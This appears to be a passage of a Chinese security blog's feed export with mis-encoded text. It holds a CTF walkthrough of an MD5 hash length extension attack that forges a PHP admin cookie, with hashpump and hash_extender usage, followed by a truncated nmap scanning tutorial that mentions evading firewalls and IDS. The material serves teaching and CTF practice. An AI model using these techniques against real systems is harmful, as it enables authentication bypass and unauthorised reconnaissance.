é€’ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹ï¼Œ<code>$sess</code>ä¸ºtokenï¼ˆ20ä¸ªæœªçŸ¥å­—ç¬¦ï¼‰ä¸â€adminâ€ç»„æˆçš„å­—ç¬¦ä¸²çš„md5å€¼ï¼Œå¹¶ä¸”ä¼šåœ¨cookieä¸­è¿”å›ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sess</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä»ä¸Šé¢çš„ä»£ç å¯çŸ¥ï¼Œ$sesså’Œ$usernameçš„å€¼æ˜¯ç”¨æˆ·æäº¤çš„ã€‚</p><p>è·å–flagçš„æ¡ä»¶æ˜¯ï¼šæäº¤ä¸€ä¸ªä¼ªé€ çš„éâ€adminâ€çš„usernameï¼Œå¹¶ä¸”æäº¤è¯¥usernameä¸tokenæ‹¼æ¥ä¹‹åçš„md5å€¼ï¼ˆä¹Ÿå°±æ˜¯$sessï¼‰ï¼Œä½†æ˜¯ç”±äºtoeknä¸ä¸ºæˆ‘ä»¬æ‰€çŸ¥æ™“ï¼Œæˆ‘ä»¬ä¹Ÿæ— ä»è®¡ç®—å‡ºæ­£ç¡®çš„md5å€¼ã€‚</p><p>æˆ‘ä»¬ç›®å‰æŒæ¡çš„ä¿¡æ¯ï¼š</p><p>1ï¼‰????????????????????admin çš„å“ˆå¸Œå€¼ ï¼ˆ?è¡¨ç¤ºçš„å†…å®¹ä¸ºæœªçŸ¥tokenï¼‰ï¼Œè®°ä¸ºH1ã€‚</p><p>2ï¼‰æœªçŸ¥tokençš„é•¿åº¦ä¸º20ã€‚</p><p>3ï¼‰usernameå’Œsessçš„å€¼æ˜¯å¯æ§çš„ã€‚</p><h3 id="2-3-3-æ ¸å¿ƒè¦ç‚¹"><a href="#2-3-3-æ ¸å¿ƒè¦ç‚¹" class="headerlink" title="2.3.3 æ ¸å¿ƒè¦ç‚¹"></a>2.3.3 æ ¸å¿ƒè¦ç‚¹</h3><p>å·§å¦™åˆ©ç”¨md5å“ˆå¸Œç®—æ³•çš„åˆ†ç»„è¿ç®—æœºåˆ¶ã€‚</p><p>å°†H1å½“ä½œæŸä¸ªæ˜æ–‡ï¼ˆè¿™ä¸ªæ˜æ–‡æˆ‘ä»¬éœ€è¦ä¼ªé€ ï¼‰ä¸­çš„ç¬¬ä¸€ä¸ªæ•°æ®å—ï¼ˆ512bitï¼‰çš„æ•£åˆ—å€¼ã€‚æ ¹æ®md5ç®—æ³•ä»¥æ¯512bitä¸ºæ•°æ®å—è®¡ç®—æ•£åˆ—å€¼çš„åŸç†ï¼Œå½“è®¡ç®—ç¬¬äºŒä¸ªæ•°æ®å—çš„æ•£åˆ—å€¼æ—¶ï¼Œä¼šä»¥H1ä½œä¸ºABCDå¯„å­˜å™¨çš„ç¼“å­˜å€¼ã€‚</p><p>æˆ‘ä»¬å¦‚æœèƒ½æŠŠå­—ç¬¦ä¸²æ‰©å±•åˆ°512bitä»¥ä¸Šï¼Œå¹¶ä¿è¯ç¬¬ä¸€æ®µçš„md5è¿ç®—ç»“æœä¸æ”¹å˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ä¸çŸ¥é“ç¬¬ä¸€æ®µçš„åŠ å¯†å†…å®¹çš„æƒ…å†µä¸‹ä»ç„¶èƒ½å¤Ÿæ±‚å¾—æ•´ä½“çš„md5å€¼ã€‚æ­¤æ‰€è°“â€æ‰©å±•â€çš„å«ä¹‰ã€‚</p><h3 id="2-3-4-æ”»å‡»å®æ–½"><a href="#2-3-4-æ”»å‡»å®æ–½" class="headerlink" title="2.3.4 æ”»å‡»å®æ–½"></a>2.3.4 æ”»å‡»å®æ–½</h3><h4 id="1ï¼‰æ¨¡ä»¿md5ç®—æ³•çš„å¡«å……"><a href="#1ï¼‰æ¨¡ä»¿md5ç®—æ³•çš„å¡«å……" class="headerlink" title="1ï¼‰æ¨¡ä»¿md5ç®—æ³•çš„å¡«å……"></a>1ï¼‰æ¨¡ä»¿md5ç®—æ³•çš„å¡«å……</h4><p>æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦åšçš„å°±æ˜¯â€æ¨¡ä»¿â€md5ç®—æ³•çš„è¡¥ä½æ–¹å¼æ¥è¿›è¡Œè¡¥ä½ã€‚</p><p>????????????????????adminçš„é•¿åº¦=20+5=25ä¸ªbyte=25*8=200bit</p><p>è¡¨ç¤ºæˆ16è¿›åˆ¶å³ä¸ºï¼š0xC8=12*16+8=200</p><p>æ‰€ä»¥å¡«å……çš„ç»“æœå¦‚ä¸‹ï¼ˆç§°ä¸ºM1ï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ã€????????????????????adminã€‘ã€8000000<span class="token punctuation">..</span><span class="token punctuation">..</span>000000ã€‘ã€c800000000000000ã€‘<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ã€ï¼ˆ????????????????????adminï¼‰ã€‘ä¸ºæ¶ˆæ¯å†…å®¹ã€‚</p><p>ã€8000000â€¦.000000ã€‘ä¸ºå¡«å……å€¼ã€‚</p><p>ã€c800000000000000ã€‘ä¸ºé•¿åº¦å¡«å……ã€‚</p><p>å¦‚æ­¤ä¸€æ¥ï¼ŒM1ç»è¿‡md5ç®—æ³•è®¡ç®—çš„ç»“æœï¼Œè·Ÿmd5ï¼ˆ????????????????????adminï¼‰è®¡ç®—çš„ç»“æœæ˜¯ä¸€è‡´çš„ã€‚æˆ‘ä»¬åªæ˜¯ä½œäº†md5ç®—æ³•æœ¬èº«å°±è¯¥åšçš„äº‹æƒ…ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5<span class="token punctuation">(</span>M1<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>md5<span class="token punctuation">(</span>????????????????????admin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚å‰æ–‡æ‰€è¿°ï¼Œå®é™…ä¸Šåœ¨æœ¬å®ä¾‹ä¸­ä¸Šè¿°å€¼æˆ‘ä»¬æ˜¯çŸ¥é“çš„ï¼Œeg:ae8b63d93b14eadd1adb347c9e26595aï¼ˆH1ï¼‰</p><h4 id="2ï¼‰å°†å·²çŸ¥çš„H1å€¼ä½œä¸ºä½œä¸ºABCDå¯„å­˜å™¨çš„ç¼“å­˜å€¼"><a href="#2ï¼‰å°†å·²çŸ¥çš„H1å€¼ä½œä¸ºä½œä¸ºABCDå¯„å­˜å™¨çš„ç¼“å­˜å€¼" class="headerlink" title="2ï¼‰å°†å·²çŸ¥çš„H1å€¼ä½œä¸ºä½œä¸ºABCDå¯„å­˜å™¨çš„ç¼“å­˜å€¼"></a>2ï¼‰å°†å·²çŸ¥çš„H1å€¼ä½œä¸ºä½œä¸ºABCDå¯„å­˜å™¨çš„ç¼“å­˜å€¼</h4><p>å°†<code>ae8b63d93b14eadd1adb347c9e26595a</code>åˆ†æˆ8å­—èŠ‚å”¯ä¸€ç»„çš„å››ç»„ï¼Œae8b63d9,3b14eadd,1adb347c,9e26595a</p><p>ç”±äºmd5æ˜¯å°ç«¯å­˜å‚¨ï¼Œè¿›è¡Œç›¸åº”çš„è°ƒæ•´ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">A</span><span class="token operator">=</span>0xd9638bae<span class="token assign-left variable">B</span><span class="token operator">=</span>0xddea143b<span class="token assign-left variable">C</span><span class="token operator">=</span>0x7c34db1a<span class="token assign-left variable">D</span><span class="token operator">=</span>0x5a59269e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3ï¼‰æ‹¼æ¥ç¬¬äºŒæ®µå†…å®¹"><a href="#3ï¼‰æ‹¼æ¥ç¬¬äºŒæ®µå†…å®¹" class="headerlink" title="3ï¼‰æ‹¼æ¥ç¬¬äºŒæ®µå†…å®¹"></a>3ï¼‰æ‹¼æ¥ç¬¬äºŒæ®µå†…å®¹</h4><p>M1+fakeadmin</p><p>å°†æˆ‘ä»¬æ±‚å‡ºæ¥çš„ABCDåºåˆ—ä½œä¸ºåˆå§‹åºåˆ—ï¼Œåˆ©ç”¨md5ç®—æ³•å¯¹<code>fakeadmin</code>è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œmd5åŠ å¯†ã€‚å¾—åˆ°md5å€¼ï¼š</p><p>æ¯”å¦‚æ˜¯ï¼šbdbe1c6fb9d921e4ba3d9d4072b702f7ï¼ˆH2ï¼‰</p><p>è¿™ä¸ªH2===md5(M1+fakeadmin)</p><h3 id="2-3-5-ä¿®æ”¹cookieè·å–flag"><a href="#2-3-5-ä¿®æ”¹cookieè·å–flag" class="headerlink" title="2.3.5 ä¿®æ”¹cookieè·å–flag"></a>2.3.5 ä¿®æ”¹cookieè·å–flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">username</span><span class="token operator">=</span>M1+fakeadmin<span class="token assign-left variable">session</span><span class="token operator">=</span>bdbe1c6fb9d921e4ba3d9d4072b702f7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="ä¸‰ã€æ”»å‡»å·¥å…·"><a href="#ä¸‰ã€æ”»å‡»å·¥å…·" class="headerlink" title="ä¸‰ã€æ”»å‡»å·¥å…·"></a>ä¸‰ã€æ”»å‡»å·¥å…·</h1><h2 id="3-1-hash-extender"><a href="#3-1-hash-extender" class="headerlink" title="3.1 hash_extender"></a>3.1 hash_extender</h2><p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a> ã€hash_extenderã€‘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-d</span> è¢«æ‰©å±•çš„æ˜æ–‡<span class="token parameter variable">-a</span> é™„åŠ çš„åˆ°åŸæ¥hashçš„padding<span class="token parameter variable">-l</span> ç›çš„é•¿åº¦<span class="token parameter variable">-f</span> åŠ å¯†æ–¹å¼<span class="token parameter variable">-s</span> å¸¦ç›åŠ å¯†çš„hashå€¼--out-data-format è¾“å‡ºæ ¼å¼<span class="token parameter variable">--quiet</span> ä»…è¾“å‡ºå¿…è¦çš„å€¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-hashpump"><a href="#3-2-hashpump" class="headerlink" title="3.2 hashpump"></a>3.2 hashpump</h2><h3 id="3-2-1-å®‰è£…"><a href="#3-2-1-å®‰è£…" class="headerlink" title="3.2.1 å®‰è£…"></a>3.2.1 å®‰è£…</h3><h4 id="1ï¼‰Mac"><a href="#1ï¼‰Mac" class="headerlink" title="1ï¼‰Mac"></a>1ï¼‰Mac</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> hashpump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Error: hashpump has been disabled because it has a removed upstream repository<span class="token operator">!</span> It was disabled on <span class="token number">2024</span>-09-16.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2ï¼‰kali"><a href="#2ï¼‰kali" class="headerlink" title="2ï¼‰kali"></a>2ï¼‰kali</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libssl-dev//git clone https://github.com/bwall/HashPump.git è¿™ä¸ªåœ°å€å·²ç»ä¸å­˜åœ¨äº†<span class="token function">git</span> clone https://github.com/2H-K/hashpumpy_changed<span class="token builtin class-name">cd</span> hashpumpy_changed<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2025-02-12%2014.12.58.png"><h3 id="3-2-2-ä½¿ç”¨"><a href="#3-2-2-ä½¿ç”¨" class="headerlink" title="3.2.2 ä½¿ç”¨"></a>3.2.2 ä½¿ç”¨</h3><ul><li><code>-s</code> æˆ– <code>--signature</code>ï¼šä»å·²çŸ¥æ¶ˆæ¯ä¸­è·å–çš„ç­¾åï¼ˆå“ˆå¸Œå€¼ï¼‰ã€‚</li><li><code>-d</code> æˆ– <code>--data</code>ï¼šå·²çŸ¥æ¶ˆæ¯çš„æ•°æ®ã€‚</li><li><code>-a</code> æˆ– <code>--additional</code>ï¼šä½ æƒ³è¦æ·»åŠ åˆ°å·²çŸ¥æ¶ˆæ¯ä¸­çš„ä¿¡æ¯ã€‚</li><li><code>-k</code> æˆ– <code>--keylength</code>ï¼šç”¨äºç­¾ç½²åŸå§‹æ¶ˆæ¯çš„å¯†é’¥çš„å­—èŠ‚é•¿åº¦ã€‚</li></ul><h3 id="3-2-2-å®æˆ˜ä½¿ç”¨"><a href="#3-2-2-å®æˆ˜ä½¿ç”¨" class="headerlink" title="3.2.2 å®æˆ˜ä½¿ç”¨"></a>3.2.2 å®æˆ˜ä½¿ç”¨</h3><p>è§æœ¬ç«™ã€Šweb-buuoj-([De1CTF 2019]SSRF Me)ã€‹ä¸€æ–‡ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€<span class="token comment"># hashpump</span>Input Signature: 8100319869013029db5beab17bfa9ba9Input Data: scanInput Key Length: <span class="token number">24</span>Input Data to Add: <span class="token builtin class-name">read</span>677ae112e086b6faf3c0f2088773371cscan<span class="token punctuation">\</span>x80<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>xe0<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹        </p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ç®—æ³•å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ç®—æ³•å®‰å…¨ </tag>
            
            <tag> å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡» </tag>
            
            <tag> md5å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmapæ‰«æå™¨</title>
      <link href="/2022/12/31/gong-fang-gong-ju-ku/nmap/"/>
      <url>/2022/12/31/gong-fang-gong-ju-ku/nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ¦‚è¿°"><a href="#ä¸€ã€æ¦‚è¿°" class="headerlink" title="ä¸€ã€æ¦‚è¿°"></a>ä¸€ã€æ¦‚è¿°</h1><ul><li><p>æ‰«æç¥å™¨ï¼Œæ•ˆç‡æ¯”è¾ƒé«˜ã€‚</p></li><li><p>ç‰¹ç‚¹ï¼šè·¨å¹³å°ï¼Œé›†æˆåœ¨kaliä¸­ã€‚</p></li><li><p>å®˜ç½‘ï¼šnmap.org</p></li><li><p>ä¹¦ç±ï¼šã€Šnmapæ¸—é€æµ‹è¯•æŒ‡å—ã€‹</p></li></ul><h1 id="äºŒã€ä½¿ç”¨"><a href="#äºŒã€ä½¿ç”¨" class="headerlink" title="äºŒã€ä½¿ç”¨"></a>äºŒã€ä½¿ç”¨</h1><p>å¦‚æœä½¿ç”¨kaliä¸­çš„nampæ—¶ï¼Œå»ºè®®ä½¿ç”¨æ¡¥æ¥ï¼Œæ¡¥æ¥æ–¹å¼å¯ä»¥è®©kaliå’Œå®¿ä¸»æœºåŒå¤„äºä¸€ä¸ªç½‘ç»œç¯å¢ƒï¼ŒNATæ¨¡å¼çš„è¯nmapçš„æ‰«ææµé‡éœ€è¦å®¿ä¸»æœºè¿›è¡Œè½¬å‘ï¼Œæ•ˆç‡æ¯”è¾ƒä½ã€‚</p><h2 id="2-1-ä¸»æœºå‘ç°"><a href="#2-1-ä¸»æœºå‘ç°" class="headerlink" title="2.1 ä¸»æœºå‘ç°"></a>2.1 ä¸»æœºå‘ç°</h2><h3 id="2-1-1-pingæ‰«æ"><a href="#2-1-1-pingæ‰«æ" class="headerlink" title="2.1.1 pingæ‰«æ"></a>2.1.1 pingæ‰«æ</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap CIDRç½‘æ®µ -sP/-sn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-sn VS -sPï¼š</p><p><code>nmap -sP</code> å’Œ <code>nmap -sn</code> éƒ½æ˜¯ç”¨äºç½‘ç»œæ‰«æçš„å·¥å…·ï¼Œä½†å®ƒä»¬åœ¨æ‰«æè¡Œä¸ºå’Œç›®çš„ä¸Šæœ‰æ‰€ä¸åŒï¼š</p><ol><li><strong><code>nmap -sP</code> (Ping Scan)</strong>:<ul><li>è¿™ä¸ªé€‰é¡¹ç”¨äºæ‰§è¡Œ ICMP echo è¯·æ±‚ï¼ˆpingï¼‰æ¥ç¡®å®šå“ªäº›ä¸»æœºæ˜¯åœ¨çº¿çš„ã€‚</li><li>å®ƒä¸ä¼šæ‰«æä»»ä½•ç«¯å£ï¼Œåªæ˜¯æ£€æŸ¥ä¸»æœºæ˜¯å¦å“åº” ICMP è¯·æ±‚ã€‚</li><li>è¿™ä¸ªé€‰é¡¹é€šå¸¸ç”¨äºé¿å…è¢«ç›®æ ‡ä¸»æœºçš„é˜²ç«å¢™æˆ–å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰æ³¨æ„åˆ°ï¼Œå› ä¸ºå®ƒä¸å‘é€ä»»ä½•ç«¯å£æ‰«ææ•°æ®åŒ…ã€‚</li><li><code>-sP</code> å¯ä»¥å¿«é€Ÿè¯†åˆ«ç½‘ç»œä¸­æ´»è·ƒçš„ä¸»æœºï¼Œä½†ä¸ä¼šæä¾›å…³äºå¼€æ”¾ç«¯å£æˆ–æœåŠ¡çš„ä¿¡æ¯ã€‚</li></ul></li><li><strong><code>nmap -sn</code> (No Port Scan)</strong>:<ul><li>è¿™ä¸ªé€‰é¡¹ç”¨äºæ‰§è¡Œä¸»æœºå‘ç°ï¼Œä½†ä¸è¿›è¡Œç«¯å£æ‰«æã€‚</li><li>ä¸ <code>-sP</code> ç±»ä¼¼ï¼Œ<code>-sn</code> ä¹Ÿä¼šæ£€æŸ¥ä¸»æœºæ˜¯å¦åœ¨çº¿ï¼Œä½†å®ƒä½¿ç”¨çš„æ–¹æ³•å¯èƒ½åŒ…æ‹¬æ›´å¹¿æ³›çš„åè®®ï¼Œå¦‚ ARP è¯·æ±‚ï¼ˆåœ¨å±€åŸŸç½‘ä¸­ï¼‰æˆ–å…¶ä»–æ–¹æ³•ï¼Œè€Œä¸æ˜¯ä»…ä»…ä¾èµ–äº ICMPã€‚</li><li><code>-sn</code> é€‰é¡¹åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥ç»•è¿‡æŸäº›ç±»å‹çš„é˜²ç«å¢™æˆ– IDSï¼Œå› ä¸ºå®ƒä¸å‘é€æ ‡å‡†çš„ç«¯å£æ‰«ææ•°æ®åŒ…ã€‚</li><li>ä¸ <code>-sP</code> ä¸€æ ·ï¼Œ<code>-sn</code> ä¸ä¼šæä¾›å…³äºå¼€æ”¾ç«¯å£æˆ–æœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚</li></ul></li></ol><p><strong>ä¸»è¦åŒºåˆ«</strong>:</p><ul><li><code>-sP</code> ä¸»è¦ä¾èµ–äº ICMP æ¥ç¡®å®šä¸»æœºæ˜¯å¦åœ¨çº¿ï¼Œè€Œ <code>-sn</code> å¯èƒ½ä½¿ç”¨å¤šç§æ–¹æ³•ï¼ŒåŒ…æ‹¬ ICMPï¼Œä½†ä¸é™äºæ­¤ã€‚</li><li><code>-sP</code> åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½æ›´å®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œå› ä¸ºå®ƒå‘é€çš„æ˜¯æ ‡å‡†çš„ ICMP è¯·æ±‚ï¼Œè€Œ <code>-sn</code> å¯èƒ½ä½¿ç”¨æ›´éšè”½çš„æ–¹æ³•ã€‚</li><li>ä¸¤è€…éƒ½ä¸ä¼šæ‰«æç«¯å£ï¼Œå› æ­¤ä¸ä¼šæ˜¾ç¤ºå¼€æ”¾ç«¯å£æˆ–æœåŠ¡çš„ä¿¡æ¯ã€‚</li></ul><p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p><ul><li>å¦‚æœä½ åªæƒ³å¿«é€Ÿæ£€æŸ¥ç½‘ç»œä¸­å“ªäº›ä¸»æœºæ˜¯åœ¨çº¿çš„ï¼Œè€Œä¸å…³å¿ƒç«¯å£ä¿¡æ¯ï¼Œ<code>-sP</code> æˆ– <code>-sn</code> éƒ½æ˜¯åˆé€‚çš„é€‰æ‹©ã€‚</li><li>å¦‚æœä½ åœ¨ä¸€ä¸ªé™åˆ¶ ICMP æµé‡çš„ç¯å¢ƒä¸­ï¼Œæˆ–è€…éœ€è¦æ›´éšè”½çš„æ‰«æï¼Œ<code>-sn</code> å¯èƒ½æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚</li></ul><p>åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œé€‰æ‹©å“ªä¸ªé€‰é¡¹å–å†³äºä½ çš„å…·ä½“éœ€æ±‚å’Œç½‘ç»œç¯å¢ƒã€‚</p></blockquote><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2024-12-31%2013.42.56.png" alt="ä¸»æœºå‘ç°ç¤ºä¾‹" style="zoom:35%;"><h2 id="2-2-ç«¯å£æ‰«æ"><a href="#2-2-ç«¯å£æ‰«æ" class="headerlink" title="2.2 ç«¯å£æ‰«æ"></a>2.2 ç«¯å£æ‰«æ</h2><h3 id="2-2-1-æ‰«ææŸä¸ªä¸»æœº"><a href="#2-2-1-æ‰«ææŸä¸ªä¸»æœº" class="headerlink" title="2.2.1 æ‰«ææŸä¸ªä¸»æœº"></a>2.2.1 æ‰«ææŸä¸ªä¸»æœº</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap IP <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é»˜è®¤æ‰«ætop 1000 ä¸ªç«¯å£ã€‚</p><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2024-12-31%2013.46.48.png" alt="ä¸»æœºç«¯å£æ‰«æç¤ºä¾‹" style="zoom:35%;"><h3 id="2-2-2-ç«¯å£å‚æ•°é…ç½®"><a href="#2-2-2-ç«¯å£å‚æ•°é…ç½®" class="headerlink" title="2.2.2 ç«¯å£å‚æ•°é…ç½®"></a>2.2.2 ç«¯å£å‚æ•°é…ç½®</h3><p>-p æŒ‡å®šç«¯å£</p><p>egï¼š</p><ul><li><p>-p 80</p></li><li><p>-p 1-80</p></li><li><p>-p 90ï¼Œ3389ï¼Œ22ï¼Œ21</p></li><li><p>-p 1-80ï¼Œ3389ï¼Œ22</p></li><li><p>-p- â‡” -p 1-65535</p></li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2024-12-31%2013.49.32.png" alt="-p æŒ‡å®šç«¯å£" style="zoom:35%;"><h3 id="2-2-3-æ‰«ææ–¹å¼"><a href="#2-2-3-æ‰«ææ–¹å¼" class="headerlink" title="2.2.3 æ‰«ææ–¹å¼"></a>2.2.3 æ‰«ææ–¹å¼</h3><h4 id="1ï¼‰å…¨è¿æ¥æ‰«æ-sT"><a href="#1ï¼‰å…¨è¿æ¥æ‰«æ-sT" class="headerlink" title="1ï¼‰å…¨è¿æ¥æ‰«æ -sT"></a>1ï¼‰å…¨è¿æ¥æ‰«æ -sT</h4><p>TCP å…¨è¿æ¥æ‰«æã€-sTã€‘ã€å»ºç«‹å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‘</p><p>wiresharkæŠ“åŒ…åˆ†æï¼š</p><p>å¯åŠ¨wiresharkæŠ“åŒ…ï¼Œå¹¶æ‰«æ53ç«¯å£ï¼š</p><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.40.24.png" alt="æ‰«æç›®æ ‡çš„53ç«¯å£" style="zoom:30%;"><p>è¿‡æ»¤ï¼š</p><ul><li>ç«¯å£å¼€å¯çš„æƒ…å†µ</li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.40.52.png" style="zoom:75%;"><p>é¦–å…ˆå®Œæˆä¸‰æ¬¡æ¡æ‰‹ã€‚</p><ul><li>ç«¯å£å…³é—­çš„æƒ…å†µ</li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.49.49.png" style="zoom:75%;"><h4 id="2ï¼‰SYN-åŠè¿æ¥æ‰«æ-sS"><a href="#2ï¼‰SYN-åŠè¿æ¥æ‰«æ-sS" class="headerlink" title="2ï¼‰SYN åŠè¿æ¥æ‰«æ -sS"></a>2ï¼‰SYN åŠè¿æ¥æ‰«æ -sS</h4><p>SYN åŠè¿æ¥æ‰«æã€-sSã€‘ ã€åªè¿›è¡Œä¸‰æ¬¡æ¡æ‰‹çš„å‰ä¸¤æ­¥ã€‘</p><p>æŠ“åŒ…åˆ†æï¼š</p><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.54.25.png" style="zoom:35%;"><ul><li>ç«¯å£å¼€å¯çš„æƒ…å†µ</li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.58.47.png" style="zoom:35%;"><p><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.58.26.png" style="zoom:75%;">ã€synã€‘ã€syn ackã€‘ã€rstã€‘</p><ul><li>ç«¯å£å…³é—­çš„æƒ…å†µ</li></ul><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.57.23.png" style="zoom:35%;"><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2021-03-31%20%E4%B8%8B%E5%8D%887.56.57.png" style="zoom:75%;"><p>â€‹      ã€synã€‘ã€rstã€‘</p><h4 id="3ï¼‰éšè”½æ‰«æ"><a href="#3ï¼‰éšè”½æ‰«æ" class="headerlink" title="3ï¼‰éšè”½æ‰«æ"></a>3ï¼‰éšè”½æ‰«æ</h4><p>ã€ä¸é€‚ç”¨ä¸windowsç³»ç»Ÿã€‘ã€å‘é€ç•¸å½¢çš„æ•°æ®åŒ…ã€‘</p><ul><li>Nullæ‰«æ ã€-sNã€‘ã€æ ‡å¿—ä½å…¨ä¸º0ã€‘</li></ul><blockquote><p><strong>Nullæ‰«æï¼ˆ-sNï¼‰</strong>ï¼šåœ¨è¿™ç§æ‰«æä¸­ï¼ŒNmap å‘é€ä¸€ä¸ªæ²¡æœ‰è®¾ç½®ä»»ä½•æ ‡å¿—ä½çš„TCPæ•°æ®åŒ…ã€‚å¦‚æœç›®æ ‡ç«¯å£å…³é—­ï¼Œæ“ä½œç³»ç»Ÿé€šå¸¸ä¼šå›å¤ä¸€ä¸ªå¸¦æœ‰RSTï¼ˆé‡ç½®ï¼‰æ ‡å¿—ä½çš„TCPæ•°æ®åŒ…ã€‚å¦‚æœç«¯å£å¼€æ”¾ï¼Œæ ¹æ®TCP 